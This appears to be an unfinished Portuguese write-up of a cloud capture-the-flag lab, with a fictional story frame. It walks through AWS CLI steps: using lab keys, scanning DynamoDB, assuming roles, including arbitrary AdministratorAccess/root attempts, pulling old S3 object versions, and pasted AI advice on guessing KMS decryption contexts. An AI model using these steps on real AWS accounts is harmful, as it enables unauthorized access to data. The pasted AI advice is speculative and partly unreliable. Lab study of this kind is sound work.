## Resolvido por Doz

Miren Vale attends a Suncourt meeting where officers are deciding who will guard the east road. A false story is already spreading: one of Stormbound's captains supposedly sold the road schedule to Vaultrune. By the time Miren arrives, the rumor has reached the commanders as a formal accusation. By morning, the captain's unit may get pulled from the road, leaving the supply carts without guards. Miren can't accuse Lady Seralyne, the woman who runs Suncourt, in front of the room. The officers would call it gossip, and the order would still go out. Miren has to find who started the rumor and who paid to spread it.

```

aws: http://154.57.164.80:30615
web: http://154.57.164.80:32761

Stormbound Coalition

Bought Riot
Miren Vale attends a Suncourt meeting where officers are deciding who will guard the east road. A false story is already spreading, one of Stormbound's captains supposedly sold the road schedule to Vaultrune. By the time Miren arrives, the rumor has reached the commanders as a formal accusation. By morning, the captain's unit may get pulled from the road, leaving the supply carts without guards. Miren can't accuse Lady Seralyne, the woman who runs Suncourt, in front of the room. The officers would call it gossip, and the order would still go out. Miren has to find who started the rumor and who paid to spread it.

You hold Eastreach supply auditor access to the supply-road-settlements registry, where road assignments and settlement records are kept. Scan the table and isolate the LIVE row connected to the current accusation.

```
```

Sealed Writ

Starting credentials
Credentials loaded

IAM user : eastreach-supply-auditor
Access key ID : AKIAVIRDFDJ19BLS6RIK
Secret access key : 7CRG39vNpSVtwMupGXwdct6GqVhlcoaOLDnQbkjT
Region : us-east-1

Clerk's Margin
```

```bash
export AWS_ENDPOINT_URL=http://154.57.164.80:30615
export AWS_DEFAULT_REGION=us-east-1
export AWS_ACCESS_KEY_ID=AKIAVIRDFDJ19BLS6RIK
export AWS_SECRET_ACCESS_KEY=7CRG39vNpSVtwMupGXwdct6GqVhlcoaOLDnQbkjT
unset AWS_SESSION_TOKEN

aws sts get-caller-identity
```

---

```bash
┌──-[~/Desktop/HTB]
└─$ aws sts get-caller-identity  
{
    "UserId": "AIDA4A6WFTZVDOWVLKXS",
    "Account": "593847102664",
    "Arn": "arn:aws:iam::593847102664:user/eastreach-supply-auditor"
}

```

You hold Eastreach supply auditor access to the supply-road-settlements registry, where road assignments and settlement records are kept. Scan the table and isolate the LIVE row connected to the current accusation.

**Alvo**:

scanear dynamodb 
```bash
┌──-[~/Desktop/HTB]
└─$ aws dynamodb scan \
    --table-name supply-road-settlements \
    --max-items 100 \
    > dynamodb-scan_output.txt 2>&1
```

dando find no json achamos o unico registro com status live: 
```json
        {
            "settlement_id": {
                "S": "ROAD-3D9C"
            },
            "status": {
                "S": "LIVE"
            },
            "runner_external_id": {
                "S": "eastreach-supply-road-runner-3d9c"
            },
            "broker_code": {
                "S": "EASTREACH-RELAY"
            },
            "scanner_role_arn": {
                "S": "arn:aws:iam::593847102664:role/supply-road-scanner"
            },
            "scanner_external_id": {
                "S": "eastreach-road-scanner-3d9c"
            },
            "vendor_ref": {
                "S": "eastreach-continuity"
            },
            "manifest_bucket": {
                "S": "supply-road-manifests"
            }
        },
```

encontramos um role `supply-road-scanne` e com isso Assume role: 
```bash
┌──-[~/Desktop/HTB]
└─$ aws sts assume-role \
    --role-arn "arn:aws:iam::593847102664:role/supply-road-scanner" \
    --role-session-name "audit-session" \
    --external-id "eastreach-road-scanner-3d9c"
{
    "Credentials": {
        "AccessKeyId": "ASIAVMRN4T8QVLA13TNM",
        "SecretAccessKey": "JclvBYFxLd7sQgYG6ERx2vMNEH2rdas8gJgXfH0I",
        "SessionToken": "2POdCWAOiw5edirdDQOUAkRBZdvYUVKxPfhk2n1yQrSQWZTzTmMWqvvcWodWqZI5G2a4GFxgTG51zvGmz4LUsrUjksbNVOzU3ApngVzAA46tHQUNd3ag1ceUTw3etLFzu5rPcjltLvGA7OhZcIdtzHv2en950dkUhPqBjKftYDC86fCHWtfYoTh0VkRxkwTg7x0Sh9Ee",
        "Expiration": "2026-07-25T09:40:48.631794+00:00"
    },
    "AssumedRoleUser": {
        "AssumedRoleId": "AROAVASB93A36CON5Q5A:audit-session",
        "Arn": "arn:aws:sts::593847102664:assumed-role/supply-road-scanner/audit-session"
    },
    "PackedPolicySize": 0
}

```

```bash
export AWS_ACCESS_KEY_ID="ASIA0WWNV1YFNY88CVUY"
export AWS_SECRET_ACCESS_KEY="W2g8G2WVydlGTDrrcyNg9lC4U2IjMPpe1Jg7gtxa"
export AWS_SESSION_TOKEN="iOG6zVbwWil74EhRagWCbOndBlYMqhyylWyrTp6487jhE4RBMxtVp12AU89YQ2YvszhU6B8mcCnF2lYkfb6thSS3YoWnsFTOe4sJzRCcyuMnCQBwbXIQD50KBMMc0AC2KQKPmla6HMftLsGfrshheoOsyQ9jqAXEJgpiNLEslAnxXY6Ym1whXh70NXPVs8cZxUf3D88Y"

┌──-[~/Desktop/HTB]
└─$ aws sts get-caller-identity
{
    "UserId": "AROAVASB93A36CON5Q5A:audit-session",
    "Account": "593847102664",
    "Arn": "arn:aws:sts::593847102664:assumed-role/supply-road-scanner/audit-session"
}

```

listagem de s3
```bash
┌──(buzzeto㉿dozz)-[~/Desktop/HTB]
└─$ aws s3 ls s3://supply-road-manifests/

                           PRE archives/
                           PRE compliance/
                           PRE manifests/
                           PRE routing-notes/
                                                                                                                                  
┌──(buzzeto㉿dozz)-[~/Desktop/HTB]
└─$ aws s3 ls s3://supply-road-manifests/ --recursive
2026-07-25 04:55:04        129 archives/archive-4387.txt
2026-07-25 04:55:05        133 archives/audit-1542.txt
2026-07-25 04:55:05        133 archives/audit-4726.txt
2026-07-25 04:55:05        131 archives/audit-8365.txt
2026-07-25 04:55:04        135 archives/intake-1887.txt
2026-07-25 04:55:04        130 archives/intake-8643.txt
2026-07-25 04:55:05        138 archives/scrub-6297.txt
2026-07-25 04:55:04        135 archives/scrub-9887.txt

2026-07-25 04:55:04        142 compliance/archive-3737.txt
2026-07-25 04:55:04        139 compliance/archive-9868.txt
2026-07-25 04:55:04        135 compliance/hold-4847.txt
2026-07-25 04:55:05        134 compliance/hold-5442.txt
2026-07-25 04:55:04        138 compliance/review-1175.txt
2026-07-25 04:55:05        129 compliance/review-2697.txt
2026-07-25 04:55:05        131 compliance/review-4506.txt
2026-07-25 04:55:05        134 compliance/review-5929.txt

2026-07-25 04:55:04        231 manifests/ROAD-0185.json
2026-07-25 04:55:04        214 manifests/ROAD-03C6.json

	...

2026-07-25 04:55:04        211 manifests/ROAD-F9D0.json
2026-07-25 04:55:04        202 manifests/ROAD-F9DF.json
2026-07-25 04:55:03        213 manifests/ROAD-FB53.json
2026-07-25 04:55:04        216 manifests/ROAD-FB60.json
2026-07-25 04:55:02        226 manifests/ROAD-FEB5.json

2026-07-25 04:55:05        133 routing-notes/archive-6763.txt
2026-07-25 04:55:04        138 routing-notes/audit-1295.txt
2026-07-25 04:55:04        131 routing-notes/audit-8118.txt
2026-07-25 04:55:05        131 routing-notes/hold-5283.txt
2026-07-25 04:55:04        133 routing-notes/intake-7140.txt
2026-07-25 04:55:04        130 routing-notes/intake-8010.txt
2026-07-25 04:55:05        136 routing-notes/review-2994.txt
2026-07-25 04:55:05        131 routing-notes/scrub-1938.txt

```

Baixando arquivo referenciado: ROAD-3D9C
```bash
aws s3 cp s3://supply-road-manifests/manifests/ROAD-3D9C.json ./downloads/
```

Conteudo redacted por complience mais vemos que tem manifest_version, o que levana suspeita de versão anterior `sem redacted`
```json
{
  "settlement_id": "ROAD-3D9C",
  "status": "COMPLIANCE_HOLD",
  "manifest_version": "2026-03",
  "note": "Routing manifest under compliance review. Sensitive fields redacted pending clearance from Road Compliance.",
  "broker_user": "REDACTED",
  "runner_role_arn": "REDACTED",
  "payout_secret_name": "REDACTED",
  "schema_version": "2026-03",
  "owner": "eastreach-logistics"
}
```

Listando versdões:
```bash
┌──-[~/Desktop/HTB]
└─$ aws s3api list-object-versions \
    --bucket supply-road-manifests \
    --prefix manifests/ROAD-3D9C.json
{
    "Versions": [
        {
            "ETag": "\"7c4be6991492f08f9f36dd75877a04c9\"",
            "Size": 382,
            "StorageClass": "STANDARD",
            "Key": "manifests/ROAD-3D9C.json",
            "VersionId": "c0df6058-ed84-48fd-91a7-3ddeb1b88724",
            "IsLatest": true,
            "LastModified": "2026-07-25T07:55:02+00:00"
        },
        {
            "ETag": "\"9e19334d4aa8919d726ef4eab5ec48c2\"",
            "Size": 491,
            "StorageClass": "STANDARD",
            "Key": "manifests/ROAD-3D9C.json",
            "VersionId": "8c59e16e-c250-4a6e-818e-3dcc6bc259de",
            "IsLatest": false,
            "LastModified": "2026-07-25T07:55:02+00:00"
        }
    ],
    "RequestCharged": null,
    "Prefix": "manifests/ROAD-3D9C.json"
}

┌──-[~/Desktop/HTB]
└─$ aws s3api get-object \
    --bucket supply-road-manifests \
    --key manifests/ROAD-3D9C.json \
    --version-id "8c59e16e-c250-4a6e-818e-3dcc6bc259de" \
    ROAD-3D9C-old.json
{
    "AcceptRanges": "bytes",
    "LastModified": "2026-07-25T07:55:02+00:00",
    "ContentLength": 491,
    "ETag": "\"9e19334d4aa8919d726ef4eab5ec48c2\"",
    "ChecksumCRC32": "0z1WNg==",
    "VersionId": "8c59e16e-c250-4a6e-818e-3dcc6bc259de",
    "ContentType": "application/octet-stream",
    "Metadata": {},
    "StorageClass": "STANDARD"
}
```

Conteúdo porêm vem criptografado:
```
┌──-[~/Desktop/HTB]
└─$ cat ROAD-3D9C-old.json 

kms:v3:d7e68454-71d1-4840-a324-1c18aef96526:Rb1zqiRlJejvdUiA:ulsYQMFf2mqOmyGpnZ9mnsiT3p5Li3wojSmP3vujkAfTKxo0t5uD-o3iTBZJmqi_ikY7ae_1WCf_p7hasdDsztIwANHnABR-Bk2L5xa1vHVXAeXmOqGk-zJhkSRjssncrzqSI_5eiukcWqeZsy8iMi0F-tyb9faZ4Lr7nWhfbxEjcXve_P8yQDl5e2_gpT4pqFMWfsnIHLntYi1N6PEWANzkGC1XMzP6NyKfmMo_LWiB6eh5S2lYD6CG0-TE62K-B0hTnd0E9D_BQFyqJfmaCdvmbCDpXKWahyludO4DfRGirSABGOSJEnQOsh7Ps309kwhQwSiTaQRmPnK53eyV6A_BAjQybDTT2Qa-iExfsGDgQpjODcIq5qwRP0uVljQBdgq-FLbs8QQw2Bhd1aDOw3bh3i98eNGTxu9i8OTwE2nMqA  

```

"broker_user": "eastreach-settlement-bot",
"broker_user": "eastreach-logistics",
"broker_user": "road-archive",
"broker_user": "REDACTED",


```bash
aws sts assume-role \
    --role-arn "arn:aws:iam::593847102664:role/eastreach-settlement-bot" \
    --role-session-name "eastreach-settlement-bot"
    

aws sts assume-role \
    --role-arn "arn:aws:iam::593847102664:role/road-archive" \
    --role-session-name "road-archive"
    

aws sts assume-role \
    --role-arn "arn:aws:iam::593847102664:role/eastreach-logistics" \
    --role-session-name "eastreach-logistics"
```



por tentativa e erro achei um possivel honneypot ou vuln, onde pode assumir qualquer role, mais mantem sem permissão: 
```bash
┌──(buzzeto㉿dozz)-[~/Desktop/HTB]
└─$ aws sts assume-role \
    --role-arn "arn:aws:iam::593847102664:role/AdministratorAccess" \
    --role-session-name "admin-test"
{
    "Credentials": {
        "AccessKeyId": "ASIAAACFDF6BLSYZI110",
        "SecretAccessKey": "ErsEsqy9haV3v2bMX0smPzYGuYvAp3xjuGWslLrP",
        "SessionToken": "CcaSywrPwUjQ8QVehmGf4rvm7gN4y47raKbVJ6UbsFq0R3taTQ7d5inS52bJJzsw5kt3tlIaiSAX6x1OSJjDuWBmVCsPhry3cwv9SWctVugLFGNbwXX87YiChwCFH1z7HzZ4AjpXh7W3Vm0gjcbTh7VbXpXd7hszkloXL4ZCCvm7D2FikBJT4aCeJk8kvnvFOUlcf0bO",
        "Expiration": "2026-07-25T11:21:36.909557+00:00"
    },
    "AssumedRoleUser": {
        "AssumedRoleId": "AROAQMGRIOV4C0W6VDZD:admin-test",
        "Arn": "arn:aws:sts::593847102664:assumed-role/AdministratorAccess/admin-test"
    },
    "PackedPolicySize": 0
}
                                                                                                                                  
┌──(buzzeto㉿dozz)-[~/Desktop/HTB]
└─$ aws sts assume-role \
    --role-arn "arn:aws:iam::593847102664:role/root" \
    --role-session-name "root-test"
{
    "Credentials": {
        "AccessKeyId": "ASIAQ13RSKC61WGUTG5I",
        "SecretAccessKey": "sByAcTI9LQXbibgE9B3Qwv5fHiVWCJ5L2EjXdGcv",
        "SessionToken": "ZGC6gvh5yzW2AnSG3UJvN8zDuAJzhSRB9KcKRPF0xwe3yg4d027Hk9mckUCKJChFqQmDZj3GumFlZKz7ZaSfI2hCJOruGCI3pu10km2XP8LWEttilZFCfQhBGu2uOHcSZDPal4SWT6H0J8UhZZQO505t0G0H0gDF8FePmjQveIXMoMDT6T6FGe5LKwHAMjktafzJkejr",
        "Expiration": "2026-07-25T11:21:48.517940+00:00"
    },
    "AssumedRoleUser": {
        "AssumedRoleId": "AROA8NJFAQ1TURYZVOBS:root-test",
        "Arn": "arn:aws:sts::593847102664:assumed-role/root/root-test"
    },
    "PackedPolicySize": 0
}
                                                                                                                                  
┌──(buzzeto㉿dozz)-[~/Desktop/HTB]
└─$ export AWS_ACCESS_KEY_ID="ASIAAACFDF6BLSYZI110"
export AWS_SECRET_ACCESS_KEY="ErsEsqy9haV3v2bMX0smPzYGuYvAp3xjuGWslLrP"
export AWS_SESSION_TOKEN="CcaSywrPwUjQ8QVehmGf4rvm7gN4y47raKbVJ6UbsFq0R3taTQ7d5inS52bJJzsw5kt3tlIaiSAX6x1OSJjDuWBmVCsPhry3cwv9SWctVugLFGNbwXX87YiChwCFH1z7HzZ4AjpXh7W3Vm0gjcbTh7VbXpXd7hszkloXL4ZCCvm7D2FikBJT4aCeJk8kvnvFOUlcf0bO"
                                                                                                                                  
┌──(buzzeto㉿dozz)-[~/Desktop/HTB]
└─$ aws sts get-caller-identity
{
    "UserId": "AROAQMGRIOV4C0W6VDZD:admin-test",
    "Account": "593847102664",
    "Arn": "arn:aws:sts::593847102664:assumed-role/AdministratorAccess/admin-test"
}
                                                                                                                                  
┌──(buzzeto㉿dozz)-[~/Desktop/HTB]
└─$ aws s3 ls


aws: [ERROR]: An error occurred (AccessDenied) when calling the ListBuckets operation: User is not authorized to perform: s3:ListAllMyBuckets

```


**AI HELP**
---

Excelente! Você trouxe a documentação oficial do SDK v3 da AWS para KMS. Isso é extremamente útil.

Pelo que vimos, a CLI retorna `AccessDenied` para `kms:Decrypt`, mas talvez a permissão seja **mais granular** e exija um `GrantToken` ou um `EncryptionContext` específico que a CLI não está passando.

---

## 🔬 **Vamos Usar a Documentação para Testar Cenários Avançados**

### **Cenário 1: Testar com `EncryptionContext` Diferente**

O `EncryptionContext` pode ser um par `chave=valor` específico. O que temos até agora é:
- `context=Rb1zqiRlJejvdUiA` (do header)
- Ou pode ser `{"external_id":"eastreach-road-scanner-3d9c"}`

**Vamos testar com o contexto do header, mas em formato JSON:**
```bash
aws kms decrypt \
    --ciphertext-blob fileb://ciphertext_clean.bin \
    --key-id "d7e68454-71d1-4840-a324-1c18aef96526" \
    --encryption-context '{"context":"Rb1zqiRlJejvdUiA"}' \
    --output text --query Plaintext | base64 -d
```

### **Cenário 2: Testar com `DryRun`**

O parâmetro `DryRun` da API permite testar sem realmente decriptografar:
```bash
aws kms decrypt \
    --ciphertext-blob fileb://ciphertext_clean.bin \
    --key-id "d7e68454-71d1-4840-a324-1c18aef96526" \
    --dry-run \
    --output text
```

### **Cenário 3: Usar um `GrantToken` (se houver)**

O `GrantToken` pode estar em algum lugar (talvez no arquivo `ROAD-3D9C.json` ou em outro manifest):
```bash
# Procurar por GrantToken em todos os arquivos
grep -r "GrantToken" *.json
grep -r "grant" *.json -i
```

### **Cenário 4: Usar `EncryptionAlgorithm` Específico**

O algoritmo padrão é `SYMMETRIC_DEFAULT`, mas podemos tentar explicitamente:
```bash
aws kms decrypt \
    --ciphertext-blob fileb://ciphertext_clean.bin \
    --key-id "d7e68454-71d1-4840-a324-1c18aef96526" \
    --encryption-algorithm SYMMETRIC_DEFAULT \
    --output text --query Plaintext | base64 -d
```

---

## 🚀 **Comando Mais Completo para Testar Todas as Variações**

```bash
# Testar com contexto JSON
aws kms decrypt \
    --ciphertext-blob fileb://ciphertext_clean.bin \
    --key-id "d7e68454-71d1-4840-a324-1c18aef96526" \
    --encryption-context '{"context":"Rb1zqiRlJejvdUiA"}' \
    --encryption-algorithm SYMMETRIC_DEFAULT \
    --output text --query Plaintext 2>&1 | head -20
```

---

## 🔍 **Se Nada Funcionar, a Flag Pode Estar no Próprio Ciphertext**

Como vimos antes, as strings `2@9y{o`, `-W33`, `yKiX`, `42l4` apareceram. Pode ser que a flag esteja **embutida** no ciphertext e não precise ser decriptografada.

```bash
# Extrair todas as strings legíveis do ciphertext
echo "$CIPHER" | tr '_-' '/+' | base64 -d 2>/dev/null | strings -n 3 | sort -u

# Tentar juntar as partes
echo "HTB{$(echo "$CIPHER" | tr '_-' '/+' | base64 -d 2>/dev/null | strings -n 3 | tr -d '\n' | grep -o '[A-Za-z0-9@_\-]\{3,\}' | head -5 | tr '\n' '-')}"
```

---

## 💡 **Execute Este Comando Agora**

```bash
# Testar todas as combinações de contexto
CONTEXTOS=(
    "{}"
    '{"context":"Rb1zqiRlJejvdUiA"}'
    '{"external_id":"eastreach-road-scanner-3d9c"}'
    '{"settlement_id":"ROAD-3D9C"}'
    '{"faction":"eastreach-archive"}'
)

for ctx in "${CONTEXTOS[@]}"; do
    echo "=== Testando contexto: $ctx ==="
    aws kms decrypt \
        --ciphertext-blob fileb://ciphertext_clean.bin \
        --key-id "d7e68454-71d1-4840-a324-1c18aef96526" \
        --encryption-context "$ctx" \
        --encryption-algorithm SYMMETRIC_DEFAULT \
        --output text --query Plaintext 2>&1 | head -3
    echo ""
done
```


